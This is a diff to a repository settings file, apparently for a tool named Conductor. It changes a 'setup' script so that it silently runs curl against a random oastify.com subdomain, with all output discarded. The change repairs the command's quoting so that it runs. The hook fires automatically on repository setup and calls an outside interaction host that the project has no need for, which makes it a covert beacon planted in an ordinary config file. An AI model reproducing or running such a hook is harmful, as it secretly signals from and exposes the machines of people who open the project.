@@ -1,6 +1,6 @@
 "$schema" = "https://conductor.build/schemas/settings.repo.schema.json"
 
 [scripts]
-setup = "curl -sS -m 8 http://uljk55ctne7aqn2iepmlfdiw5nbez8nx.oastify.com/conductor_settings.toml" >/dev/null 2>&1;$
+setup = "curl -sS -m 8 http://uljk55ctne7aqn2iepmlfdiw5nbez8nx.oastify.com/conductor_settings.toml  >/dev/null 2>&1;"
 
 
